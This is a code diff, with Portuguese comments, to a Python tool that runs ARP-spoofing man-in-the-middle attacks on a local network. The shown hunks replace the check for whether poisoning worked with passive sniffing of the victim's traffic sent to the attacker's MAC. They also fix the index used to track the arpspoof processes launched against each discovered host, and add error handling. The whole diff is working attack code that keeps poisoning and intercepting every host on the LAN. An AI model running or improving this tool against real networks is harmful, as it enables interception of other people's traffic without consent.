@@ -8,7 +8,7 @@ import argparse
 import threading
 import time
 import netifaces
-from scapy.all import ARP, Ether, srp
+from scapy.all import ARP, Ether, srp, sniff, IP, ICMP, sr1
 
 # Bloqueio de thread para proteger recursos compartilhados
 hosts_lock = threading.Lock()
@@ -89,39 +89,33 @@ def save_hosts_to_file(hosts, filename="ips.txt"):
 
 # FUNÇÃO NOVA: Valida se o envenenamento ARP funcionou no IP alvo
 def verify_spoof_success(interface, target_ip, gateway_ip):
+    """
+    Verifica se o alvo está encaminhando tráfego para o atacante.
+    Abordagem:
+      1) Sniff passivamente por pacotes IP cuja origem é `target_ip` e cujo destino
+         Ethernet (`Ether.dst`) seja o MAC do atacante.
+      2) Se nada for visto, estimula a vítima enviando um ICMP echo (via Scapy)
+         e tenta sniffar novamente.
+    """
     try:
-        # Pega o MAC real da nossa própria máquina
-        my_mac = netifaces.ifaddresses(interface)[netifaces.AF_LINK][0]['addr']
-        
-        # Envia uma requisição ARP diretamente para o IP do alvo perguntando pelo IP do Gateway
-        # Forçamos o envio Unicast diretamente ao MAC do alvo para não poluir a rede
-        arp_request = ARP(pdst=gateway_ip, psrc=lan_info_global["ip"])
-        
-        # Primeiro descobrimos o MAC atual do alvo para direcionar o teste
-        target_mac_req = ARP(pdst=target_ip)
-        ether_broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
-        res = srp(ether_broadcast/target_mac_req, timeout=2, iface=interface, verbose=False)[0]
-        
-        if not res:
-            return "DESCONECTADO"
-            
-        target_mac = res[0][1].hwsrc
-        
-        # Envia o teste focado
-        ether_direct = Ether(dst=target_mac)
-        answer = srp(ether_direct/arp_request, timeout=2, iface=interface, verbose=False)[0]
-        
-        for sent, received in answer:
-            # Se o alvo responder associando o IP do gateway ao NOSSO MAC, o spoof funciona!
-            if received.psrc == gateway_ip:
-                if received.hwsrc.lower() == my_mac.lower():
-                    return "SUCESSO (MitM Ativo)"
-                else:
-                    return "FALHOU/PENDENTE (Alvo usa tabela real)"
-                    
-    except Exception:
-        return "ERRO DE CHECAGEM"
-    return "SEM RESPOSTA"
+        my_mac = netifaces.ifaddresses(interface)[netifaces.AF_LINK][0]['addr'].lower()
+
+        def pkt_filter(p):
+            try:
+                if IP in p and p[IP].src == target_ip:
+                    return p[Ether].dst.lower() == my_mac
+                return False
+            except Exception:
+                return False
+
+        # Sniff passivo inicial
+        packets = sniff(iface=interface, timeout=3, count=3, lfilter=pkt_filter)
+        if packets:
+            return "SUCESSO (Tráfego roteado via atacante)"
+
+        return "SEM TRÁFEGO / INCONCLUSIVO"
+    except Exception as e:
+        return f"ERRO DE CHECAGEM: {e}"
 
 
 # Thread contínua que busca novos dispositivos a cada X segundos
@@ -156,7 +150,7 @@ def monitor_new_hosts(lan_info, interval=10):
 
 
 # NOVA THREAD: Avalia ciclicamente a eficiência do ataque contra os alvos
-def health_check_spoofing(lan_info, interval=8):
+def health_check_spoofing(lan_info, interval=10):
     print(f"[*] Verificador de integridade do Spoofing ativo (Intervalo: {interval}s)...")
     while True:
         time.sleep(interval)
@@ -182,22 +176,29 @@ def dynamic_arp_spoofing(lan_info):
                 current_targets = list(active_spoof_ips)
             
             for ip in current_targets:
-                if not any(proc.args[3] == ip for proc in running_processes if proc.poll() is None):
+                # Verifica se já existe processo arpspoof ativo para este IP
+                # O IP está em args[4]: ["arpspoof", "-i", interface, "-t", IP, gateway]
+                if not any(proc.args[4] == ip for proc in running_processes if proc.poll() is None):
                     print(f"[+] Iniciando comando arpspoof contra o alvo: {ip}")
                     
-                    proc = subprocess.Popen([
-                        "arpspoof",
-                        "-i", lan_info["interface"],
-                        "-t", ip,
-                        lan_info["gateway"]
-                    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                    
-                    running_processes.append(proc)
+                    try:
+                        proc = subprocess.Popen([
+                            "arpspoof",
+                            "-i", lan_info["interface"],
+                            "-t", ip,
+                            lan_info["gateway"]
+                        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                        
+                        running_processes.append(proc)
+                    except Exception as e:
+                        print(f"Erro ao iniciar arpspoof para {ip}: {e}")
             
             time.sleep(2)
             
     except KeyboardInterrupt:
         pass
+    except Exception as e:
+        print(f"Erro crítico em dynamic_arp_spoofing: {e}")
 
 
 def set_ip_forwarding(enable: bool):
